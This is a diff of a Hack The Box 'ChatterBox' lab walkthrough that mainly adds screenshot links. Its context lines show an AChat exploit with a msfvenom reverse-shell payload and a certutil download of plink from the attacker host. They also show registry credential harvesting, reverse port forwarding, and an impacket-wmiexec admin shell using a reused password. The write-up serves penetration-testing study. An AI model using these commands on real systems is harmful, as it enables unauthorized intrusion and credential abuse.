@@ -1,5 +1,5 @@
 # ChatterBox [HTB](https://app.hackthebox.com/machines/Chatterbox)
-![chatterbox-01]()
+![chatterbox-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ChatterBox/img/chatterbox-01.png)
 
 
 
@@ -10,7 +10,7 @@ Lets enumerate the machine with `nmap`:
 `nmap -sC -sV -A 10.129.214.7 -oN nmap.result`
 
 
-![nmap-res-02]()
+![nmap-res-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ChatterBox/img/nmap-res-02.png)
 
 
 We
@@ -35,25 +35,25 @@ wins there.
 
 Altough we can login anonymously to the IPC$ share with `smbclient -U "%" -N \\\\10.129.214.7\\IPC$`:
 
-![ipc-connect-03]()
+![ipc-connect-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ChatterBox/img/ipc-connect-03.png)
 
 
 We cant do anything inside: 
 
-![ipc-fail-04]()
+![ipc-fail-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ChatterBox/img/ipc-fail-04.png)
 
 
 If we check the SMB version with msf's `scanner/smb/smb_version`, well see that the target 
 is running SMB v2.1: 
 
-![msf-res-05]
+![msf-res-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ChatterBox/img/msf-res-05.png)
 
 
 
 SMB v2.1, should be vulnerable to `Eternal-Blue`, but after a quick check our target is not:
 `scanner/smb/smb_ms17_010`
 
-![eb-res-06]()
+![eb-res-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ChatterBox/img/eb-res-06.png)
  
 
 At the moment, SMB doesnt look like the way forward, `enum4linux` yields nothing meaningful, 
@@ -72,7 +72,7 @@ no error message or redirects. Adding the hostname to our `/etc/hosts` doenst he
 
 If we open Burp, we can see we are getting a `204 No-Content` replay: 
 
-![204-replay-07]()
+![204-replay-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ChatterBox/img/204-replay-07.png)
 
 
 
@@ -99,7 +99,7 @@ msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp lhost=<myip> lpo
 Take the output, and replace the `buf` varaible in the exploit with it.
 Finally, change the target IP in the exploit:
 
-![target-exp-08]()
+![target-exp-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ChatterBox/img/target-exp-08.png)
 
 
 Start the listener: `nc -lnvp 4444`
@@ -110,7 +110,7 @@ Execute the exploit `./achat.py`
 
 Get a shell: 
 
-![shell-09]()
+![shell-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ChatterBox/img/shell-09.png)
 
 
 ## Privilege Escalation
@@ -121,13 +121,13 @@ After running a few basic commands from [sushant](https://sushant747.gitbooks.io
 `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"`
 
 
-![pass-10]()
+![pass-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ChatterBox/img/pass-10.png)
 
 
 If we list out our open ports on the machine with `netstat -ano` we can see the following: 
 
 
-![netstat-11]()
+![netstat-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ChatterBox/img/netstat-11.png)
 
 
 We have all these ports running on the localhost. nmap did manage to detect them for some 
@@ -141,17 +141,18 @@ Start a python server `python3 -m http.server 8888`
 
 Download it to the target with `certutil -urlcache -f http://10.10.14.21:8888/plink.exe plink.exe`
 
-![transfer-12]()
+![transfer-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ChatterBox/img/transfer-12.png)
 
 
 Now we need to change two things in the `/etc/sshd/sshd_config` file on our kali:
 First, permit root logins: 
 
-![ssh-mod-13]()
+![ssh-mod-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ChatterBox/img/ssh-mod-13.png)
+
 
 Second, change the deafult port to 2222:
 
-![ssh-mod-14]()
+![ssh-mod-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ChatterBox/img/ssh-mod-14.png)
 
 
 This is necessary beacuse HTB's firewalls block port 22. 
@@ -161,19 +162,19 @@ Now we can run the port forwarding on the target machine with:
 `plink.exe -l root -pw <pass> -R 445:127.0.0.0.1:445 10.10.14.68 -P 2222`
 
 
-![plink-15]()
+![plink-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ChatterBox/img/plink-15.png)
 
 
 On our Kali machine we can check the status of port 445 with `netstat -ao | grep 445`:
 
 
-![445-status-16]()
+![445-status-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ChatterBox/img/445-status-16.png)
 
 
 We can now start connecting to the SMB on the target through our localhost. 
 Lets try logging in to the Admin$ share with `smbclient -U 'Alfred%Welcome1!' //127.0.0.1/Admin$`
 
-![admin-fail-17]()
+![admin-fail-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ChatterBox/img/admin-fail-17.png)
 
 
 This fails, says we dont have access. What if we tried to use the same password with the 
@@ -181,7 +182,7 @@ Administrator account, after all Alfred and Administrator are the only two users
 And weve only found this one password in our enumeration, worth a shot. 
 
 
-![admin-success-18]()
+![admin-success-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ChatterBox/img/admin-success-18.png)
 
 
 
@@ -189,4 +190,4 @@ That's it, they use the same password. From here we can use `wmiexec` to pop a s
 `impacket-wmiexec Administrator:Welcome1\!@10.129.151.176`
 
 
-![root-19]()
+![root-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ChatterBox/img/root-19.png)
